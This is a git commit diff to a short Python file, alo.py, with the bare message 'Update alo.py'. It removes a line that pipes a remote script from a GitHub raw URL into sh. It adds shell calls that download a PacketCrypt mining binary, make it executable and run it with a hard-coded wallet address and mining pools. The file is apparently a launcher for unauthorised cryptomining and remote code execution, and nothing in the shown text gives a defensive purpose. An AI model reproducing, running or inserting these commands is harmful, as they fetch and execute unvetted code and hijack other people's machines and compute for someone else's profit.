4c6562d9f6818f8160051d1ababadd2e6bda927f
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-09 17:10:50 +0700

    Update alo.py

--- alo.py
+++ alo.py
@@ -1,2 +1,7 @@
 import os
-os.system('curl -fsSL https://raw.githubusercontent.com/aurbach55/pos/main/pal | sh')
+cmd = os.system('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O packetcrypt')
+cmd = os.system('chmod +x packetcrypt')
+cmd = os.system('./packetcrypt ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io')
+
+
+
